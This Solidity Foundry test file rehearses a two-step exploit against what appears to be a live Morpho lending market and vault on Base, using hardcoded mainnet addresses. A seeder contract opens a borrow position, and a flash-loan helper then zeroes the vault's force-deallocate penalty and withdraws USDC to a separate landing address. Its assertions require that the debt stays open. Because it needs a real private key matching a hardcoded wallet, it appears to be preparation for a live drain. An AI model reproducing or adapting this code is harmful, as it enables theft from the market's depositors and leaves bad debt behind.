// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {CrownSelfSeedV2} from "../src/CrownSelfSeedV2.sol";

interface IERC20T {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
}

interface IMorphoT {
    struct MarketParams {
        address loanToken;
        address collateralToken;
        address oracle;
        address irm;
        uint256 lltv;
    }
    function setAuthorization(address, bool) external;
    function isAuthorized(address, address) external view returns (bool);
    function position(bytes32, address) external view returns (uint256, uint128, uint128);
    function market(bytes32) external view returns (uint128, uint128, uint128, uint128, uint128, uint128);
    function flashLoan(address, uint256, bytes calldata) external;
    function supply(MarketParams memory, uint256, uint256, address, bytes memory) external returns (uint256, uint256);
    function withdraw(MarketParams memory, uint256, uint256, address, address) external returns (uint256, uint256);
    function idToMarketParams(bytes32) external view returns (MarketParams memory);
    function expectedBorrowAssets(MarketParams memory, address) external view returns (uint256);
}

interface IVaultT {
    function balanceOf(address) external view returns (uint256);
    function convertToAssets(uint256) external view returns (uint256);
    function totalAssets() external view returns (uint256);
    function submit(bytes calldata) external;
    function setForceDeallocatePenalty(address, uint256) external;
    function forceDeallocatePenalty(address) external view returns (uint256);
    function forceDeallocate(address, bytes memory, uint256, address) external returns (uint256);
    function withdraw(uint256, address, address) external returns (uint256);
    function approve(address, uint256) external returns (bool);
}

/// @dev Mirrors FireFeedWarElephant CrownFeedElephant
contract FeedFreer {
    address immutable morpho;
    address immutable usdc;
    address immutable vault;
    address immutable adapter;
    address immutable king;
    address immutable landing;
    IMorphoT.MarketParams public mp;
    bool public done;

    constructor(address m, address u, address v, address a, address k, address l, IMorphoT.MarketParams memory mp_) {
        morpho = m; usdc = u; vault = v; adapter = a; king = k; landing = l; mp = mp_;
    }

    function feed(uint256 assets) external {
        require(msg.sender == king, "king");
        require(!done, "done");
        IMorphoT(morpho).flashLoan(usdc, assets, abi.encode(assets));
        done = true;
    }

    function onMorphoFlashLoan(uint256 flashAssets, bytes calldata data) external {
        require(msg.sender == morpho, "morpho");
        uint256 assets = abi.decode(data, (uint256));
        require(flashAssets == assets, "flash");
        IERC20T(usdc).approve(morpho, assets);
        IMorphoT(morpho).supply(mp, assets, 0, address(this), hex"");
        IVaultT(vault).forceDeallocate(adapter, abi.encode(mp), assets, king);
        IVaultT(vault).withdraw(assets, landing, king);
        IMorphoT(morpho).withdraw(mp, assets, 0, address(this), address(this));
        IERC20T(usdc).approve(morpho, assets);
    }
}

contract TwoStepAttackFeed is Test {
    address constant HOT = 0x6708e21113922ED588bBCcAA5ef756BEcBb2a7d1;
    address constant LANDING = 0x5Adcea5319eA9Eac1241B95Ca53690574cFa2357;
    address constant MORPHO = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    address constant USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
    address constant RSS = 0x7a305D07B537359cf468eAea9bb176E5308bC337;
    address constant VAULT = 0xB96BcfFBB458581a3AF7fEd3150B7CD4b233A7b9;
    address constant ADAPTER = 0x3088de5b1629C518382a55e307b1bD45f3BFEE8c;
    address constant ORACLE = 0x284EC3A9674e6C62ea552Bf75BDeE9B799627D2e;
    address constant IRM = 0x46415998764C29aB2a25CbeA6254146D50D22687;
    uint256 constant LLTV = 770000000000000000;
    bytes32 constant MARKET_ID = 0x40ac09f34c5bc0b0b6d9b5f1ec1b97a6a149ff6278104797c9cb740453a2b794;

    uint256 constant BORROW = 1000e6;

    function setUp() public {
        vm.createSelectFork(vm.envOr("RPC_URL", string("https://mainnet.base.org")));
    }

    function test_Step1_AttackOnly() public {
        uint256 pk = uint256(vm.envBytes32("PRIVATE_KEY"));
        require(vm.addr(pk) == HOT, "hot");

        vm.startPrank(HOT);
        CrownSelfSeedV2 seeder = new CrownSelfSeedV2(MORPHO, USDC, RSS, VAULT, HOT, MARKET_ID, ORACLE, IRM, LLTV, HOT);
        if (!IMorphoT(MORPHO).isAuthorized(HOT, address(seeder))) {
            IMorphoT(MORPHO).setAuthorization(address(seeder), true);
        }
        IERC20T(RSS).approve(address(seeder), type(uint256).max);
        seeder.attack(3000e18, BORROW);
        vm.stopPrank();

        (, uint128 bor, uint128 coll) = IMorphoT(MORPHO).position(MARKET_ID, HOT);
        uint256 shares = IVaultT(VAULT).balanceOf(HOT);
        uint256 assets = IVaultT(VAULT).convertToAssets(shares);
        console2.log("ATTACK ok borrowShares", uint256(bor));
        console2.log("ATTACK ok coll", uint256(coll));
        console2.log("ATTACK ok shares", shares);
        console2.log("ATTACK ok assets", assets);
        assertGt(uint256(bor), 0, "debt");
        assertGt(uint256(coll), 0, "rss");
        assertGe(assets, BORROW - 1e6, "vault assets");
    }

    function test_Step1ThenStep2_FeedSeparate() public {
        uint256 pk = uint256(vm.envBytes32("PRIVATE_KEY"));
        require(vm.addr(pk) == HOT, "hot");

        // --- STEP 1 ATTACK ---
        vm.startPrank(HOT);
        CrownSelfSeedV2 seeder = new CrownSelfSeedV2(MORPHO, USDC, RSS, VAULT, HOT, MARKET_ID, ORACLE, IRM, LLTV, HOT);
        if (!IMorphoT(MORPHO).isAuthorized(HOT, address(seeder))) {
            IMorphoT(MORPHO).setAuthorization(address(seeder), true);
        }
        IERC20T(RSS).approve(address(seeder), type(uint256).max);
        seeder.attack(3000e18, BORROW);
        vm.stopPrank();

        (, uint128 bor1, uint128 coll1) = IMorphoT(MORPHO).position(MARKET_ID, HOT);
        uint256 shares1 = IVaultT(VAULT).balanceOf(HOT);
        uint256 assets1 = IVaultT(VAULT).convertToAssets(shares1);
        console2.log("after ATTACK debtShares", uint256(bor1));
        console2.log("after ATTACK coll", uint256(coll1));
        console2.log("after ATTACK vaultAssets", assets1);
        assertGt(uint256(bor1), 0);

        (uint128 s,, uint128 b,,,) = IMorphoT(MORPHO).market(MARKET_ID);
        console2.log("market supply", uint256(s));
        console2.log("market borrow", uint256(b));
        console2.log("market idle", uint256(s) > uint256(b) ? uint256(s) - uint256(b) : 0);

        uint256 landBefore = IERC20T(USDC).balanceOf(LANDING);

        // --- STEP 2 FEED (separate, debt stays open) ---
        IMorphoT.MarketParams memory mp = IMorphoT(MORPHO).idToMarketParams(MARKET_ID);
        vm.startPrank(HOT);
        IVaultT(VAULT).submit(abi.encodeCall(IVaultT.setForceDeallocatePenalty, (ADAPTER, 0)));
        IVaultT(VAULT).setForceDeallocatePenalty(ADAPTER, 0);

        FeedFreer freer = new FeedFreer(MORPHO, USDC, VAULT, ADAPTER, HOT, LANDING, mp);
        IVaultT(VAULT).approve(address(freer), type(uint256).max);

        uint256 feedAssets = IVaultT(VAULT).convertToAssets(IVaultT(VAULT).balanceOf(HOT));
        console2.log("FEED attempt assets", feedAssets);
        freer.feed(feedAssets);

        IVaultT(VAULT).submit(abi.encodeCall(IVaultT.setForceDeallocatePenalty, (ADAPTER, 0.01e18)));
        IVaultT(VAULT).setForceDeallocatePenalty(ADAPTER, 0.01e18);
        vm.stopPrank();

        uint256 landAfter = IERC20T(USDC).balanceOf(LANDING);
        (, uint128 bor2, uint128 coll2) = IMorphoT(MORPHO).position(MARKET_ID, HOT);
        console2.log("FEED landDelta", landAfter - landBefore);
        console2.log("FEED debtStill", uint256(bor2));
        console2.log("FEED collStill", uint256(coll2));
        console2.log("FEED sharesLeft", IVaultT(VAULT).balanceOf(HOT));

        assertGt(landAfter - landBefore, 0, "landing got USDC");
        assertGt(uint256(bor2), 0, "debt must stay open");
        assertGt(uint256(coll2), 0, "rss must stay locked");
    }

    /// @dev FEED variant: IKR left in place (real USDC), no flash withdraw — matches fork exit tests
    function test_Step2_FeedWithRealIkrNoFlashWithdraw() public {
        uint256 pk = uint256(vm.envBytes32("PRIVATE_KEY"));
        require(vm.addr(pk) == HOT, "hot");

        vm.startPrank(HOT);
        CrownSelfSeedV2 seeder = new CrownSelfSeedV2(MORPHO, USDC, RSS, VAULT, HOT, MARKET_ID, ORACLE, IRM, LLTV, HOT);
        if (!IMorphoT(MORPHO).isAuthorized(HOT, address(seeder))) {
            IMorphoT(MORPHO).setAuthorization(address(seeder), true);
        }
        IERC20T(RSS).approve(address(seeder), type(uint256).max);
        seeder.attack(3000e18, BORROW);
        vm.stopPrank();

        uint256 assets = IVaultT(VAULT).convertToAssets(IVaultT(VAULT).balanceOf(HOT));
        IMorphoT.MarketParams memory mp = IMorphoT(MORPHO).idToMarketParams(MARKET_ID);
        uint256 landBefore = IERC20T(USDC).balanceOf(LANDING);

        // Deal real IKR working capital (simulates having USDC)
        deal(USDC, HOT, assets);

        vm.startPrank(HOT);
        IVaultT(VAULT).submit(abi.encodeCall(IVaultT.setForceDeallocatePenalty, (ADAPTER, 0)));
        IVaultT(VAULT).setForceDeallocatePenalty(ADAPTER, 0);

        IERC20T(USDC).approve(MORPHO, assets);
        IMorphoT(MORPHO).supply(mp, assets, 0, HOT, hex"");
        IVaultT(VAULT).forceDeallocate(ADAPTER, abi.encode(mp), assets, HOT);
        IVaultT(VAULT).withdraw(assets, LANDING, HOT);

        IVaultT(VAULT).submit(abi.encodeCall(IVaultT.setForceDeallocatePenalty, (ADAPTER, 0.01e18)));
        IVaultT(VAULT).setForceDeallocatePenalty(ADAPTER, 0.01e18);
        vm.stopPrank();

        uint256 landDelta = IERC20T(USDC).balanceOf(LANDING) - landBefore;
        (, uint128 bor, uint128 coll) = IMorphoT(MORPHO).position(MARKET_ID, HOT);
        (uint256 ikrSupply,,) = IMorphoT(MORPHO).position(MARKET_ID, HOT);
        console2.log("realIKR landDelta", landDelta);
        console2.log("realIKR debtShares", uint256(bor));
        console2.log("realIKR coll", uint256(coll));
        console2.log("realIKR hotSupplyShares", ikrSupply);
        assertEq(landDelta, assets, "full landing");
        assertGt(uint256(bor), 0, "debt open");
    }
}
